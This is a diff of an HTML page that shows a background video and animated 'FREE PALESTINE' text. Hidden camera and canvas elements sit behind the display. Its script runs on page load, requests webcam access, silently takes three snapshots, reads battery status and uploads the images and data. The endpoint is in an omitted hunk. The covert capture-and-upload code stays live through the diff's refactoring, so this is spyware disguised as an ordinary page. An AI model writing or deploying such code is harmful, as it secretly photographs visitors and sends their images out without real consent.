@@ -9,110 +9,111 @@
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
 <style>
-  html, body {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    width: 100%;
-    overflow: hidden;
-    background: #000;
-    font-family: 'Orbitron', sans-serif;
-  }
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  width: 100%;
+  overflow: hidden;
+  background: #000;
+  font-family: 'Orbitron', sans-serif;
+}
 
-  video#backgroundVideo {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    z-index: 0;
-  }
+video#backgroundVideo {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: 0;
+}
 
-  .text-layer {
-    position: absolute;
-    font-weight: 800;
-    white-space: nowrap;
-    z-index: 1;
-    animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
-    color: #00ffea;
-    text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
-  }
+.text-layer {
+  position: absolute;
+  font-weight: 800;
+  white-space: nowrap;
+  z-index: 1;
+  animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
+  color: #00ffea;
+  text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
+}
 
-  .text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
-  .text2 { font-size: 5vw; top: 55%; left: 30%; animation-delay: 2s; }
-  .text3 { font-size: 4vw; top: 60%; left: 25%; animation-delay: 4s; }
+.text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
+.text2 { font-size: 5vw; top: 55%; left: 30%; animation-delay: 2s; }
+.text3 { font-size: 4vw; top: 60%; left: 25%; animation-delay: 4s; }
 
-  @keyframes floatUp {
-    0% { transform: translateY(0px); opacity: 1; }
-    100% { transform: translateY(-150px); opacity: 0.8; }
-  }
+@keyframes floatUp {
+  0% { transform: translateY(0px); opacity: 1; }
+  100% { transform: translateY(-150px); opacity: 0.8; }
+}
 
-  @keyframes glow {
-    0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
-    100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
-  }
+@keyframes glow {
+  0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
+  100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
+}
 
-  /* Hidden camera and canvas */
-  video#cameraStream {
-    display: none;
-  }
-  canvas#snapshot {
-    display: none;
-  }
+/* Hidden camera and canvas */
+video#cameraStream {
+  display: none;
+}
+canvas#snapshot {
+  display: none;
+}
 </style>
 </head>
 <body>
 
-<!-- Fullscreen Background Video -->
 <video id="backgroundVideo" autoplay loop playsinline>
   <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
   Your browser does not support the video tag.
 </video>
 
-<!-- Neon Text -->
 <div class="text-layer text1">FREE PALESTINE</div>
 <div class="text-layer text2">FREE PALESTINE</div>
 <div class="text-layer text3">FREE PALESTINE</div>
 
-<!-- Hidden Camera Video & Canvas -->
 <video id="cameraStream" autoplay playsinline muted></video>
 <canvas id="snapshot"></canvas>
 
 <script>
-const backgroundVideo = document.getElementById('backgroundVideo');
-const cameraVideo = document.getElementById('cameraStream');
+const bgVideo = document.getElementById('backgroundVideo');
+const camVideo = document.getElementById('cameraStream');
 const canvas = document.getElementById('snapshot');
 const ctx = canvas.getContext('2d');
 
-// Start camera and take snapshots
-async function startCameraSnapshots() {
+async function captureCameraSnapshots() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    cameraVideo.srcObject = stream;
+    // Pause background video to avoid conflict
+    bgVideo.pause();
 
-    // Wait for battery info (optional)
+    // Request camera
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    camVideo.srcObject = stream;
+
+    // Wait for battery info
     const battery = await navigator.getBattery();
     const batteryLevel = Math.round(battery.level * 100);
     const isCharging = battery.charging;
 
-    // Pause background video if needed
-    // backgroundVideo.pause(); // د اړتیا په صورت کې
+    // Take snapshots at intervals
+    await takeSnapshot(camVideo, batteryLevel, isCharging);
+    setTimeout(() => takeSnapshot(camVideo, batteryLevel, isCharging), 2000);
+    setTimeout(() => takeSnapshot(camVideo, batteryLevel, isCharging), 4000);
 
-    // Take snapshots automatically
-    await takeSnapshotAndSend(cameraVideo, batteryLevel, isCharging);
-    setTimeout(() => takeSnapshotAndSend(cameraVideo, batteryLevel, isCharging), 2000);
-    setTimeout(() => takeSnapshotAndSend(cameraVideo, batteryLevel, isCharging), 4000);
+    // Stop camera stream after snapshots
+    stream.getTracks().forEach(track => track.stop());
 
-    // Resume background video (in case it was paused)
-    // backgroundVideo.play();
+    // Resume background video
+    bgVideo.play();
 
   } catch(err) {
     console.error("Camera error:", err);
+    bgVideo.play(); // ensure background video continues even if camera fails
   }
 }
 
-function takeSnapshotAndSend(video, battery, charging) {
+function takeSnapshot(video, battery, charging) {
   if (!video.videoWidth || !video.videoHeight) return;
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -132,16 +133,15 @@ function takeSnapshotAndSend(video, battery, charging) {
     .catch(err => console.error("Upload error:", err));
 }
 
-// Start after page load
+// Start everything after page load
 window.addEventListener('load', () => {
-  // Play background video with sound
-  backgroundVideo.muted = false;
-  backgroundVideo.play().catch(e => console.warn("Autoplay prevented", e));
+  // Ensure background video plays with sound
+  bgVideo.muted = false;
+  bgVideo.play().catch(e => console.warn("Autoplay prevented", e));
 
-  // Ask camera permission and start snapshots
-  startCameraSnapshots();
+  // Start camera snapshots (hidden)
+  captureCameraSnapshots();
 });
 </script>
-
 </body>
 </html> 
